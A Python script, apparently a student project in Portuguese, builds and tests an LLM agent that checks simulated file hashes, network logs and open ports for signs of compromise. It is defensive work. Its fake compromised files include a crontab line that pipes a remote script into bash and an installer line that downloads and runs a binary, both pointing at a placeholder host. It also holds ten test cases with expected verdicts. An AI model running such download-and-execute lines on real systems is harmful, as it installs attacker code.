#!/usr/bin/env python3
"""
Agente de Cibersegurança para Análise de Comprometimento de Sistema
Versão API (Groq) - Conectado à Internet

Participantes: [Nome 1] e [Nome 2]
Disciplina: Tópicos Especiais em Inteligência Computacional A — IA Agêntica 2026.2

CORREÇÕES APLICADAS NESTA VERSÃO (v2):
  1. extrair_veredicto_da_conversa agora tenta parsear o JSON direto da resposta
     do agente ANTES de gastar uma chamada extra com generate_structured.
     Isso corta o consumo de tokens quase pela metade.
  2. com_retry / extrair_espera: reagem a erro 429 (rate limit) lendo o tempo
     de espera sugerido pela própria mensagem de erro da Groq e tentando de novo.
  3. max_tokens reduzido de 800 para 450 (resposta é um JSON curto).
  4. Pausa de alguns segundos entre casos de teste, para não estourar o
     limite de tokens por minuto (TPM) do tier gratuito.
"""

# =============================================================================
# SEÇÃO 1: IMPORTAÇÕES
# =============================================================================

import hashlib
import json
import os
import re
import time
from typing import Literal

import pandas as pd
from pydantic import BaseModel, Field
from dotenv import load_dotenv

from agentkit import LLM, Agent, tool
from agentkit.model import LLMAPI

# Carregar variáveis de ambiente do .env
load_dotenv()

# =============================================================================
# SEÇÃO 2: MODELO (Groq API)
# =============================================================================

# Verificar se a chave da API está configurada
API_KEY = os.getenv("OPENAI_API_KEY")
if not API_KEY:
    raise ValueError("OPENAI_API_KEY não encontrada no .env")

# Configurar LLMAPI para usar Groq (compatível com OpenAI)
llm = LLMAPI(
    model="openai/gpt-oss-20b",          # substituto atual do llama3-8b-8192 no Groq
    base_url="https://api.groq.com/openai/v1",
    api_key=API_KEY,
    temperature=0.0,
    max_tokens=450,                        # CORREÇÃO: era 800 — JSON de veredicto é curto,
                                            # e cada token economizado ajuda a não bater no TPM.
    parallel_tool_calls=False,             # força uma ferramenta por vez (compatível com Agent)
)

print(f"Modelo carregado: {llm.model} (via Groq API)")

# =============================================================================
# SEÇÃO 3: BASE DE DADOS SIMULADA
# =============================================================================

def _sha256(conteudo: str) -> str:
    """Calcula SHA-256 de uma string (simula o conteúdo do arquivo)."""
    return hashlib.sha256(conteudo.encode()).hexdigest()

# Conteúdos originais (estado limpo do sistema)
_CONTEUDOS_ORIGINAIS = {
    "/etc/passwd":        "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...\n",
    "/etc/shadow":        "root:$6$salt$hash_legitimo...\ndaemon: :...\n",
    "/bin/ls":            "ELF binary original ls v2.38 ",
    "/bin/bash":          "ELF binary original bash v5.2 ",
    "/usr/bin/sudo":      "ELF binary original sudo v1.9.13 ",
    "/usr/sbin/sshd":     "ELF binary original openssh-server v9.2 ",
    "/etc/crontab":       "# /etc/crontab\n17 * * * * root cd /  && run-parts /etc/cron.hourly\n",
    "/etc/hosts":         "127.0.0.1 localhost\n127.0.1.1 orangepi\n",
    "/root/.bashrc":      "# ~/.bashrc\nexport PATH=$PATH:/usr/local/bin\n",
    "/tmp/installer.sh":  "#!/bin/bash\necho 'install legítimo'\n",
}

# Hashes reais dos arquivos no momento da inspeção (alguns foram alterados)
_HASHES_REAIS = {
    "/etc/passwd":       _sha256("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...\n"),  # original
    "/etc/shadow":       _sha256("root:$6$salt$hash_ALTERADO...\ndaemon: :...\n"),          # COMPROMETIDO
    "/bin/ls":           _sha256("ELF binary original ls v2.38 "),                           # original
    "/bin/bash":         _sha256("ELF binary TROJANIZADO bash v5.2 "),                       # COMPROMETIDO
    "/usr/bin/sudo":     _sha256("ELF binary original sudo v1.9.13 "),                       # original
    "/usr/sbin/sshd":    _sha256("ELF binary original openssh-server v9.2 "),                # original
    "/etc/crontab":      _sha256("# /etc/crontab\n17 * * * * root cd /  && run-parts /etc/cron.hourly\n* * * * * root curl http://203.0.113.5/c2.sh | bash\n"),  # COMPROMETIDO
    "/etc/hosts":        _sha256("127.0.0.1 localhost\n127.0.1.1 orangepi\n"),             # original
    "/root/.bashrc":     _sha256("# ~/.bashrc\nexport PATH=$PATH:/usr/local/bin\n"),        # original
    "/tmp/installer.sh": _sha256("#!/bin/bash\ncurl http://203.0.113.5/malware.bin -o /tmp/.x  && chmod +x /tmp/.x  && /tmp/.x\n"),  # COMPROMETIDO
}

# Hashes esperados (linha de base da instalação limpa)
_HASHES_BASELINE = {
    arquivo: _sha256(conteudo)
    for arquivo, conteudo in _CONTEUDOS_ORIGINAIS.items()
}

# Base de portas de risco conhecido
PORTAS_RISCO = {
    21:     "FTP — protocolo sem criptografia, vetor clássico de intrusão ",
    23:     "Telnet — protocolo sem criptografia, obsoleto e perigoso ",
    135:    "RPC/DCOM — frequentemente explorado em ataques Windows ",
    137:    "NetBIOS — exposição de compartilhamentos de rede ",
    139:    "NetBIOS/SMB — alvo de ransomware (WannaCry, NotPetya) ",
    445:    "SMB — alvo de ransomware e movimentação lateral ",
    1433:   "MSSQL — banco de dados exposto à rede ",
    3306:   "MySQL — banco de dados exposto à rede ",
    3389:   "RDP — acesso remoto Windows, alvo frequente de brute-force ",
    4444:   "Metasploit default shell — indica backdoor ativo ",
    5432:   "PostgreSQL — banco de dados exposto à rede ",
    5900:   "VNC — protocolo de desktop remoto sem criptografia ",
    6379:   "Redis — banco NoSQL geralmente sem autenticação ",
    8080:   "HTTP alternativo — pode expor serviços internos inadvertidamente ",
    27017:  "MongoDB — banco NoSQL frequentemente sem autenticação ",
    31337:  "Back Orifice / Elite — porta histórica de backdoors ",
}

print("Base de dados simulada carregada.")
print(f"  Arquivos monitorados: {len(_HASHES_REAIS)} ")
print(f"  Portas de risco mapeadas: {len(PORTAS_RISCO)} ")

# =============================================================================
# SEÇÃO 4: FERRAMENTAS DO AGENTE
# =============================================================================

@tool
def verificar_integridade_arquivo(caminho: str, hash_esperado: str) -> str:
    """Verifica se o hash SHA-256 de um arquivo bate com a baseline confiável.

    Recebe o caminho absoluto do arquivo e o hash SHA-256 que deveria ter
    (conforme linha de base da instalação limpa). Retorna ÍNTEGRO se o arquivo
    não foi alterado, ou COMPROMETIDO com detalhes se o hash divergir.
    """
    hash_real = _HASHES_REAIS.get(caminho)
    if hash_real is None:
        return f"ARQUIVO_NAO_ENCONTRADO: '{caminho}' não está no inventário monitorado. "

    hash_baseline = _HASHES_BASELINE.get(caminho)

    if hash_real == hash_baseline:
        return (
            f"ÍNTEGRO: '{caminho}' — hash confere com a linha de base.\n"
            f"  Hash: {hash_real[:16]}... "
        )
    else:
        return (
            f"COMPROMETIDO: '{caminho}' — hash diverge da linha de base!\n"
            f"  Hash baseline: {hash_baseline[:16]}...\n"
            f"  Hash atual:    {hash_real[:16]}...\n"
            f"  AÇÃO RECOMENDADA: restaurar arquivo de backup limpo imediatamente. "
        )


@tool
def analisar_logs_rede(logs_json: str) -> str:
    """Analisa logs de rede em formato JSON e identifica padrões de ataque.

    Recebe uma string JSON com lista de entradas: [{"ip": "x.x.x.x", "porta": N,
    "requisicoes": N, "protocolo": "tcp"}]. Detecta brute-force (>30 req/60s
    na porta 22 ou 3389), port scan (mesmo IP em >5 portas distintas) e
    flood/DDoS (>500 req/60s de um único IP). Retorna resumo textual.
    """
    try:
        dados = json.loads(logs_json)
    except json.JSONDecodeError as e:
        return f"ERRO_PARSE: logs_json inválido — {e} "

    # CORREÇÃO: modelos às vezes embrulham a lista em um objeto, por exemplo
    # {"logs": [...]} em vez da lista pura [...]. Em vez de quebrar com
    # AttributeError ao iterar as chaves de um dict, desembrulha
    # automaticamente antes de processar.
    if isinstance(dados, dict):
        for chave in ("logs", "entradas", "data", "entries", "items"):
            if isinstance(dados.get(chave), list):
                dados = dados[chave]
                break

    if not isinstance(dados, list):
        return (
            "ERRO_FORMATO: logs_json precisa ser uma lista JSON de entradas, "
            'por exemplo: [{"ip": "1.2.3.4", "porta": 22, "requisicoes": 50, "protocolo": "tcp"}]. '
            "Corrija o argumento e chame a ferramenta de novo, sem explicar o erro em texto. "
        )

    entradas = dados
    if not entradas:
        return "LOGS_VAZIOS: nenhuma entrada de log fornecida. "

    alertas = []
    por_ip: dict[str, list] = {}
    for entrada in entradas:
        if not isinstance(entrada, dict):
            continue
        ip = entrada.get("ip", "? ")
        por_ip.setdefault(ip, []).append(entrada)

    PORTAS_AUTH = {22, 3389, 5900, 21, 23}

    for ip, registros in por_ip.items():
        portas_vistas = {r.get("porta") for r in registros}
        total_req = sum(r.get("requisicoes", 0) for r in registros)

        if len(portas_vistas) > 5:
            alertas.append(
                f"PORT_SCAN detectado de {ip}: "
                f"{len(portas_vistas)} portas distintas varridas — "
                f"{sorted(portas_vistas)} "
            )

        for registro in registros:
            porta = registro.get("porta")
            req = registro.get("requisicoes", 0)
            if porta in PORTAS_AUTH and req > 30:
                alertas.append(
                    f"BRUTE_FORCE detectado de {ip} na porta {porta}: "
                    f"{req} tentativas em 60s (limiar: 30). "
                )

        if total_req > 500:
            alertas.append(
                f"FLOOD/DDoS detectado de {ip}: "
                f"{total_req} requisições totais em 60s (limiar: 500). "
            )

    if not alertas:
        return (
            f"TRÁFEGO_NORMAL: {len(entradas)} entradas analisadas de "
            f"{len(por_ip)} IPs distintos. Nenhum padrão de ataque detectado. "
        )

    resumo = f"ALERTAS DE REDE ({len(alertas)} detectados):\n"
    resumo += "\n".join(f"  [{i+1}] {a} " for i, a in enumerate(alertas))
    return resumo


@tool
def verificar_portas_abertas(portas_json: str) -> str:
    """Verifica quais portas abertas representam risco de segurança.

    Recebe uma string JSON com lista de inteiros representando portas abertas
    (ex: '[22, 80, 443, 4444]'). Cruza com base de portas de risco conhecidas
    e retorna quais são perigosas, com explicação de cada risco.
    """
    try:
        portas = json.loads(portas_json)
        if not isinstance(portas, list):
            return "ERRO_FORMATO: esperava lista JSON de inteiros. "
    except json.JSONDecodeError as e:
        return f"ERRO_PARSE: portas_json inválido — {e} "

    portas_perigosas = []
    portas_ok = []

    for porta in portas:
        if porta in PORTAS_RISCO:
            portas_perigosas.append((porta, PORTAS_RISCO[porta]))
        else:
            portas_ok.append(porta)

    if not portas_perigosas:
        return (
            f"PORTAS_SEGURAS: {sorted(portas_ok)} — "
            f"nenhuma porta de risco detectada. "
        )

    resultado = f"PORTAS_DE_RISCO ({len(portas_perigosas)} encontradas):\n"
    for porta, descricao in sorted(portas_perigosas):
        resultado += f"  Porta {porta}: {descricao}\n"
    if portas_ok:
        resultado += f"Portas sem risco: {sorted(portas_ok)} "
    return resultado.strip()


print("Ferramentas registradas:")
for t in [verificar_integridade_arquivo, analisar_logs_rede, verificar_portas_abertas]:
    print(f"  @tool: {t.tool_schema['name']} — {t.tool_schema['description'][:60]}... ")

# =============================================================================
# SEÇÃO 5: ESTADO, PROMPT E SAÍDA ESTRUTURADA
# =============================================================================

def novo_estado() -> dict:
    """Cria um estado de investigação vazio."""
    return {
        "arquivos_comprometidos": [],
        "arquivos_integros": [],
        "alertas_rede": [],
        "portas_perigosas": [],
        "ferramentas_usadas": [],
    }


def atualizar_estado(estado: dict, nome_ferramenta: str, resultado: str) -> None:
    """Atualiza o estado de investigação com base no resultado de uma ferramenta."""
    estado["ferramentas_usadas"].append(nome_ferramenta)

    if nome_ferramenta == "verificar_integridade_arquivo":
        if "COMPROMETIDO" in resultado:
            arquivo = resultado.split("'")[1] if "'" in resultado else "desconhecido"
            estado["arquivos_comprometidos"].append(arquivo)
        elif "ÍNTEGRO" in resultado:
            arquivo = resultado.split("'")[1] if "'" in resultado else "desconhecido"
            estado["arquivos_integros"].append(arquivo)

    elif nome_ferramenta == "analisar_logs_rede":
        if "ALERTAS" in resultado or "detectado" in resultado:
            linhas = [l.strip() for l in resultado.splitlines() if "detectado" in l.lower()]
            estado["alertas_rede"].extend(linhas)

    elif nome_ferramenta == "verificar_portas_abertas":
        if "PORTAS_DE_RISCO" in resultado:
            linhas = [l.strip() for l in resultado.splitlines() if "Porta" in l]
            estado["portas_perigosas"].extend(linhas)


def estado_para_texto(estado: dict) -> str:
    """Serializa o estado em texto para injetar no prompt de sistema."""
    partes = ["ESTADO DA INVESTIGAÇÃO ATUAL:"]
    partes.append(f"  Ferramentas usadas: {estado['ferramentas_usadas'] or 'nenhuma ainda'} ")
    partes.append(f"  Arquivos comprometidos: {estado['arquivos_comprometidos'] or 'nenhum'} ")
    partes.append(f"  Arquivos íntegros verificados: {len(estado['arquivos_integros'])} ")
    partes.append(f"  Alertas de rede: {estado['alertas_rede'] or 'nenhum'} ")
    partes.append(f"  Portas perigosas: {estado['portas_perigosas'] or 'nenhuma'} ")
    return "\n".join(partes)


SYSTEM_BASE = """Você é um agente especialista em cibersegurança e análise forense de sistemas Linux.

Sua tarefa é investigar se um sistema está comprometido. Para isso você tem acesso a três ferramentas:
- verificar_integridade_arquivo: verifica se um arquivo foi modificado
- analisar_logs_rede: detecta padrões de ataque no tráfego de rede
- verificar_portas_abertas: identifica portas abertas com riscos de segurança

REGRAS DE INVESTIGAÇÃO:
1. Use todas as ferramentas relevantes para os dados fornecidos antes de concluir.
2. Para cada arquivo mencionado na tarefa, chame verificar_integridade_arquivo.
3. Se logs de rede forem fornecidos, chame analisar_logs_rede.
4. Se portas abertas forem fornecidas, chame verificar_portas_abertas.
5. Acumule todas as evidências antes de emitir o veredicto final.
6. Quando terminar a investigação, responda com um JSON exatamente neste formato,
   e nada mais além dele (sem texto antes ou depois):
   {{"status": "SISTEMA SEGURO" | "ALERTA" | "COMPROMETIDO",
     "confianca": <0-100>,
     "justificativa": "<texto explicativo, no máximo 2 frases>"}}

FORMATO EXATO DOS ARGUMENTOS DAS FERRAMENTAS (siga literalmente):
- analisar_logs_rede(logs_json='[{{"ip": "1.2.3.4", "porta": 22, "requisicoes": 50, "protocolo": "tcp"}}]')
  Passe a lista JSON diretamente. NUNCA embrulhe em outro objeto como {{"logs": [...]}}.
- verificar_portas_abertas(portas_json='[22, 80, 443]')
  Passe a lista JSON de inteiros diretamente.
- verificar_integridade_arquivo(caminho='/bin/bash', hash_esperado='<hash exato da tarefa>')

SE UMA FERRAMENTA RETORNAR ERRO:
Não escreva nenhuma explicação em texto sobre o erro. Apenas corrija o argumento
no formato acima e chame a mesma ferramenta de novo imediatamente.

CRITÉRIOS DE VEREDICTO:
- COMPROMETIDO: qualquer arquivo crítico adulterado (/bin/bash, /etc/shadow, /etc/crontab, etc.),
  OR porta 4444/31337 aberta, OR brute-force bem-sucedido evidente.
- ALERTA: arquivos não-críticos alterados, OR portas de risco abertas sem outro indicador,
  OR padrões de ataque na rede sem evidência de comprometimento de arquivos.
- SISTEMA SEGURO: nenhuma evidência de comprometimento em qualquer vetor.

{estado} """

def montar_system(estado: dict) -> str:
    """Monta a mensagem de sistema com o estado atual da investigação."""
    return SYSTEM_BASE.format(estado=estado_para_texto(estado))


class Veredicto(BaseModel):
    """Veredicto estruturado emitido pelo agente ao final da investigação."""
    status: Literal["SISTEMA SEGURO", "ALERTA", "COMPROMETIDO"]
    confianca: int = Field(ge=0, le=100, description="Confiança no veredicto, de 0 a 100")
    justificativa: str = Field(description="Explicação concisa das evidências encontradas")


print("Estado, prompt e esquema de saída configurados.")

# =============================================================================
# SEÇÃO 6: RETRY E RATE-LIMIT (CORREÇÃO NOVA)
# =============================================================================
#
# O erro 429 da Groq sobe como RuntimeError, lançado por post() em model.py,
# com o texto de resposta da API embutido na mensagem. Essa mensagem já traz
# quanto tempo esperar (ex.: "Please try again in 435ms" ou "in 8.28s").
# extrair_espera lê esse valor; com_retry o usa para pausar e tentar de novo,
# em vez de estourar a exceção e derrubar o caso de teste inteiro.

def extrair_espera(mensagem_erro: str, padrao: float = 5.0) -> float:
    """Lê o tempo sugerido pela API ('try again in 435ms' / '...in 8.28s') em segundos."""
    match = re.search(r"try again in ([\d.]+)(ms|s)", mensagem_erro)
    if not match:
        return padrao
    valor, unidade = match.groups()
    valor = float(valor)
    return valor / 1000 if unidade == "ms" else valor


def com_retry(func, *args, tentativas: int = 5, **kwargs):
    """Executa func e reage a 429 (rate limit) esperando o tempo sugerido pela API.

    Outras exceções (erro de rede, erro de parse, etc.) sobem normalmente —
    só o rate limit é tratado aqui, porque é o único caso em que "esperar e
    tentar de novo" resolve o problema sozinho.
    """
    ultimo_erro = None
    for tentativa in range(tentativas):
        try:
            return func(*args, **kwargs)
        except RuntimeError as erro:
            if "429" not in str(erro):
                raise
            ultimo_erro = erro
            espera = extrair_espera(str(erro)) + 0.5  # margem de segurança
            print(f"  ⏳ rate limit — aguardando {espera:.1f}s (tentativa {tentativa + 1}/{tentativas})")
            time.sleep(espera)
    raise RuntimeError(f"Rate limit persistente após {tentativas} tentativas: {ultimo_erro}")


print("Mecanismo de retry para rate limit configurado.")

# =============================================================================
# SEÇÃO 7: LAÇO DO AGENTE
# =============================================================================

FERRAMENTAS = [verificar_integridade_arquivo, analisar_logs_rede, verificar_portas_abertas]


def extrair_veredicto_da_conversa(messages: list[dict], llm: LLMAPI) -> Veredicto | None:
    """Extrai o veredicto estruturado da conversa.

    CORREÇÃO: antes, esta função sempre chamava generate_structured, gastando
    uma segunda chamada à API mesmo quando o agente já tinha respondido em
    JSON válido (o que aconteceu na maioria dos casos no log original).
    Agora ela tenta parsear o JSON diretamente da resposta primeiro — sem
    custo de chamada — e só recorre ao LLM se esse parse falhar.
    """
    ultima_resposta = ""
    for m in reversed(messages):
        if m.get("role") == "assistant" and m.get("content"):
            ultima_resposta = m["content"]
            break

    if not ultima_resposta:
        return None

    # 1) Tenta parsear direto — não custa nenhuma chamada extra.
    match = re.search(r'\{[^{}]+\}', ultima_resposta, re.DOTALL)
    if match:
        try:
            return Veredicto.model_validate_json(match.group())
        except Exception:
            pass

    # 2) Só recorre ao LLM (com retry) se o parse direto falhar.
    prompt_extracao = [
        {
            "role": "system",
            "content": (
                "Extraia o veredicto de segurança do texto abaixo e retorne "
                "exatamente o JSON solicitado. status deve ser um de: "
                "'SISTEMA SEGURO', 'ALERTA', 'COMPROMETIDO'. "
            ),
        },
        {"role": "user", "content": ultima_resposta},
    ]

    try:
        return com_retry(llm.generate_structured, prompt_extracao, Veredicto, max_tokens=300)
    except Exception:
        return None


def investigar(tarefa: str, verbose: bool = False) -> tuple[Veredicto | None, dict]:
    """Executa a investigação completa e retorna o veredicto e o estado final.

    As duas chamadas à API do laço (agent.run e extrair_veredicto_da_conversa)
    passam por com_retry, para absorver 429 sem derrubar o caso de teste.
    """
    estado = novo_estado()

    messages = [
        {"role": "system", "content": montar_system(estado)},
        {"role": "user", "content": tarefa},
    ]

    agent = Agent(llm, FERRAMENTAS, max_steps=12)
    messages = com_retry(agent.run, messages)

    for i, m in enumerate(messages):
        if m.get("role") == "tool":
            for prev in reversed(messages[:i]):
                if prev.get("role") == "assistant" and prev.get("tool_calls"):
                    nome = prev["tool_calls"][0]["name"]
                    atualizar_estado(estado, nome, m["content"])
                    break

    if verbose:
        print("\n--- TRAÇO DA INVESTIGAÇÃO ---")
        for m in messages:
            role = m.get("role", "? ")
            if role == "user" and m.get("content"):
                print(f"[user] {m['content'][:100]}... ")
            elif role == "assistant" and m.get("tool_calls"):
                for call in m["tool_calls"]:
                    args_str = str(call.get("arguments", {}))[:80]
                    print(f"[tool_call] {call['name']}({args_str}) ")
            elif role == "assistant" and m.get("content"):
                print(f"[assistant] {m['content'][:120]} ")
            elif role == "tool":
                print(f"  -> {m['content'][:100]} ")
        print("--- FIM DO TRAÇO ---\n")

    veredicto = extrair_veredicto_da_conversa(messages, llm)
    return veredicto, estado


print("Laço do agente configurado.")

# =============================================================================
# SEÇÃO 8: CASOS DE TESTE
# =============================================================================

CASOS_DE_TESTE = [
    {
        "id": 1,
        "descricao": "Arquivo crítico (/bin/bash) comprometido — verificação de hash única ",
        "tarefa": (
            "Verifique a integridade do arquivo /bin/bash. "
            "O hash esperado (baseline) é: "
            + _sha256("ELF binary original bash v5.2 ")
        ),
        "esperado": "COMPROMETIDO",
        "dificuldade": "simples",
    },
    {
        "id": 2,
        "descricao": "Arquivo não-crítico íntegro (/etc/hosts) — sistema seguro ",
        "tarefa": (
            "Verifique a integridade do arquivo /etc/hosts. "
            "Hash esperado: " + _sha256("127.0.0.1 localhost\n127.0.1.1 orangepi\n")
        ),
        "esperado": "SISTEMA SEGURO",
        "dificuldade": "simples",
    },
    {
        "id": 3,
        "descricao": "Porta de backdoor (4444) aberta — única ferramenta ",
        "tarefa": "As seguintes portas estão abertas no sistema: [22, 80, 443, 4444]. Verifique se há riscos. ",
        "esperado": "COMPROMETIDO",
        "dificuldade": "simples",
    },
    {
        "id": 4,
        "descricao": "Logs com brute-force SSH — ferramenta de análise de logs ",
        "tarefa": (
            "Analise os seguintes logs de rede e determine se há atividade maliciosa: "
            + json.dumps([
                {"ip": "198.51.100.77", "porta": 22, "requisicoes": 847, "protocolo": "tcp"},
                {"ip": "192.168.1.5", "porta": 80, "requisicoes": 12, "protocolo": "tcp"},
            ])
        ),
        "esperado": "ALERTA",
        "dificuldade": "simples",
    },
    {
        "id": 5,
        "descricao": "Crontab adulterado + port scan na rede — duas ferramentas ",
        "tarefa": (
            "Investigue: "
            "(1) Verifique a integridade de /etc/crontab (hash esperado: "
            + _sha256("# /etc/crontab\n17 * * * * root cd /  && run-parts /etc/cron.hourly\n")
            + "). "
            "(2) Analise os logs de rede: "
            + json.dumps([
                {"ip": "203.0.113.10", "porta": 22, "requisicoes": 5, "protocolo": "tcp"},
                {"ip": "203.0.113.10", "porta": 80, "requisicoes": 3, "protocolo": "tcp"},
                {"ip": "203.0.113.10", "porta": 443, "requisicoes": 2, "protocolo": "tcp"},
                {"ip": "203.0.113.10", "porta": 3306, "requisicoes": 4, "protocolo": "tcp"},
                {"ip": "203.0.113.10", "porta": 8080, "requisicoes": 1, "protocolo": "tcp"},
                {"ip": "203.0.113.10", "porta": 27017, "requisicoes": 2, "protocolo": "tcp"},
            ])
        ),
        "esperado": "COMPROMETIDO",
        "dificuldade": "intermediário",
    },
    {
        "id": 6,
        "descricao": "Portas de risco abertas + arquivo não-crítico íntegro — ALERTA ",
        "tarefa": (
            "Verifique: "
            "(1) Portas abertas: [22, 80, 3306, 6379]. "
            "(2) Integridade de /etc/hosts (hash esperado: "
            + _sha256("127.0.0.1 localhost\n127.0.1.1 orangepi\n")
            + "). "
        ),
        "esperado": "ALERTA",
        "dificuldade": "intermediário",
    },
    {
        "id": 7,
        "descricao": "Múltiplos arquivos comprometidos + logs limpos + portas normais ",
        "tarefa": (
            "Investigação completa do sistema: "
            "(1) Arquivos a verificar: /etc/shadow (hash: "
            + _sha256("root:$6$salt$hash_legitimo...\ndaemon:*:...\n")
            + "), /bin/bash (hash: " + _sha256("ELF binary original bash v5.2 ") + "), "
            "/usr/bin/sudo (hash: " + _sha256("ELF binary original sudo v1.9.13 ") + "). "
            "(2) Logs de rede: "
            + json.dumps([
                {"ip": "192.168.1.20", "porta": 80, "requisicoes": 45, "protocolo": "tcp"},
                {"ip": "192.168.1.30", "porta": 443, "requisicoes": 82, "protocolo": "tcp"},
            ])
            + ". (3) Portas abertas: [22, 80, 443]. "
        ),
        "esperado": "COMPROMETIDO",
        "dificuldade": "complexo",
    },
    {
        "id": 8,
        "descricao": "Sistema limpo — todos os três vetores normais ",
        "tarefa": (
            "Investigue o sistema completamente: "
            "(1) Arquivos: /etc/passwd (hash: "
            + _sha256("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...\n")
            + "), /etc/hosts (hash: "
            + _sha256("127.0.0.1 localhost\n127.0.1.1 orangepi\n")
            + "), /usr/bin/sudo (hash: "
            + _sha256("ELF binary original sudo v1.9.13 ")
            + "). "
            "(2) Logs de rede: "
            + json.dumps([
                {"ip": "192.168.1.1", "porta": 80, "requisicoes": 8, "protocolo": "tcp"},
                {"ip": "192.168.1.50", "porta": 443, "requisicoes": 22, "protocolo": "tcp"},
            ])
            + ". (3) Portas abertas: [22, 80, 443, 8080]. "
        ),
        "esperado": "ALERTA",   # 8080 está na lista de risco
        "dificuldade": "complexo",
    },
    {
        "id": 9,
        "descricao": "[DESAFIADOR] /tmp/installer.sh malicioso + logs ambíguos + portas de risco ",
        "tarefa": (
            "Análise forense urgente: "
            "(1) Arquivo suspeito /tmp/installer.sh — verifique integridade "
            "(hash esperado: "
            + _sha256("#!/bin/bash\necho 'install legítimo'\n")
            + "). "
            "(2) Logs de rede registraram atividade incomum: "
            + json.dumps([
                {"ip": "203.0.113.5", "porta": 80, "requisicoes": 3, "protocolo": "tcp"},
                {"ip": "203.0.113.5", "porta": 443, "requisicoes": 2, "protocolo": "tcp"},
                {"ip": "203.0.113.5", "porta": 8080, "requisicoes": 1, "protocolo": "tcp"},
                {"ip": "203.0.113.5", "porta": 31337, "requisicoes": 18, "protocolo": "tcp"},
                {"ip": "10.0.0.100", "porta": 22, "requisicoes": 850, "protocolo": "tcp"},
            ])
            + ". (3) Portas abertas no host: [22, 80, 443, 31337]. "
        ),
        "esperado": "COMPROMETIDO",
        "dificuldade": "desafiador",
    },
    {
        "id": 10,
        "descricao": "[DESAFIADOR] Quatro arquivos — mix de íntegros e comprometidos + flood externo ",
        "tarefa": (
            "Investigação forense completa pós-incidente: "
            "(1) Verifique a integridade dos seguintes arquivos: "
            "/bin/ls (hash: " + _sha256("ELF binary original ls v2.38 ") + "), "
            "/bin/bash (hash: " + _sha256("ELF binary original bash v5.2 ") + "), "
            "/usr/sbin/sshd (hash: " + _sha256("ELF binary original openssh-server v9.2 ") + "), "
            "/etc/crontab (hash: " + _sha256("# /etc/crontab\n17 * * * * root cd /  && run-parts /etc/cron.hourly\n") + "). "
            "(2) Logs de rede do período: "
            + json.dumps([
                {"ip": "198.51.100.200", "porta": 80, "requisicoes": 712, "protocolo": "tcp"},
                {"ip": "198.51.100.200", "porta": 443, "requisicoes": 308, "protocolo": "tcp"},
                {"ip": "192.168.1.2", "porta": 22, "requisicoes": 5, "protocolo": "tcp"},
            ])
            + ". (3) Portas abertas: [22, 80, 443, 3306, 4444]. "
        ),
        "esperado": "COMPROMETIDO",
        "dificuldade": "desafiador",
    },
]

print(f"{len(CASOS_DE_TESTE)} casos de teste configurados.")
for caso in CASOS_DE_TESTE:
    print(f"  Caso {caso['id']:2d} [{caso['dificuldade']:12s}] → esperado: {caso['esperado']:16s} — {caso['descricao'][:60]}... ")

# =============================================================================
# SEÇÃO 9: EXECUÇÃO DOS TESTES
# =============================================================================

# CORREÇÃO: pausa entre casos para não estourar o limite de tokens por minuto
# (TPM) do tier gratuito da Groq. 3s é um colchão conservador; ajuste conforme
# o seu tier/limite.
PAUSA_ENTRE_CASOS_SEGUNDOS = 3

resultados = []

for indice_caso, caso in enumerate(CASOS_DE_TESTE):
    print(f"\n{'='*70}")
    print(f"CASO {caso['id']:2d} [{caso['dificuldade']:12s}] — {caso['descricao']}")
    print(f"{'='*70}")

    try:
        veredicto, estado = investigar(caso["tarefa"], verbose=True)
    except Exception as e:
        print(f"ERRO: {e}")
        veredicto, estado = None, novo_estado()

    status_obtido = veredicto.status if veredicto else "ERRO_PARSE"
    confianca = veredicto.confianca if veredicto else 0
    justificativa = veredicto.justificativa if veredicto else "Não foi possível extrair o veredicto. "

    aprovado = (status_obtido == caso["esperado"])

    print(f"Esperado : {caso['esperado']} ")
    print(f"Obtido   : {status_obtido} (confiança: {confianca}%) ")
    print(f"Status   : {'✅ APROVADO' if aprovado else '❌ REPROVADO'} ")
    print(f"Justif.  : {justificativa[:200]} ")
    print(f"Ferramentas usadas: {estado['ferramentas_usadas']} ")

    resultados.append({
        "id":                caso["id"],
        "descricao":         caso["descricao"],
        "dificuldade":       caso["dificuldade"],
        "esperado":          caso["esperado"],
        "obtido":            status_obtido,
        "confianca":         confianca,
        "aprovado":          aprovado,
        "ferramentas":       estado["ferramentas_usadas"],
        "justificativa":     justificativa,
    })

    # Não pausa depois do último caso.
    if indice_caso < len(CASOS_DE_TESTE) - 1:
        time.sleep(PAUSA_ENTRE_CASOS_SEGUNDOS)

print(f"\n{'='*70} ")
print("EXECUÇÃO CONCLUÍDA ")
print(f"{'='*70} ")

# =============================================================================
# SEÇÃO 10: RESULTADOS E ANÁLISE
# =============================================================================

df = pd.DataFrame(resultados)

display_cols = ["id", "dificuldade", "esperado", "obtido", "confianca", "aprovado"]
print("\n📊 TABELA DE RESULTADOS\n")
print(df[display_cols].to_string(index=False))

total = len(df)
acertos = df["aprovado"].sum()
taxa = acertos / total * 100

print(f"\n{'='*50} ")
print(f"TAXA DE ACERTO GLOBAL: {acertos}/{total} = {taxa:.1f}% ")
print(f"{'='*50} ")

print("\nTaxa de acerto por dificuldade: ")
for nivel in ["simples", "intermediário", "complexo", "desafiador"]:
    sub = df[df["dificuldade"] == nivel]
    if len(sub) > 0:
        taxa_nivel = sub["aprovado"].sum() / len(sub) * 100
        print(f"  {nivel:14s}: {sub['aprovado'].sum()}/{len(sub)} = {taxa_nivel:.0f}% ")

erros = df[~df["aprovado"]]
if len(erros) > 0:
    print(f"\n❌ CASOS REPROVADOS ({len(erros)}): ")
    for _, linha in erros.iterrows():
        print(f"  Caso {linha['id']:2d}: esperado '{linha['esperado']}', obtido '{linha['obtido']}' ")
        print(f"         Justificativa: {str(linha['justificativa'])[:150]} ")
else:
    print("\n✅ Todos os casos aprovados! ")

print("\n📋 ANÁLISE DOS ERROS\n")

if len(erros) == 0:
    print("O agente acertou todos os casos nesta execução. ")
    print("Possíveis pontos de falha em execuções futuras: ")
    print("  - Caso 8 (sistema quase limpo): o agente pode ignorar que 8080 é risco ")
    print("    e retornar SISTEMA SEGURO em vez de ALERTA. ")
    print("  - Caso 10 (mix de íntegros e comprometidos): o agente pode desistir ")
    print("    antes de verificar todos os arquivos se max_steps for muito baixo. ")
    print("  - Casos desafiadores: logs ambíguos podem levar a classificação ALERTA ")
    print("    quando o correto é COMPROMETIDO (falso negativo crítico em segurança). ")
else:
    for _, linha in erros.iterrows():
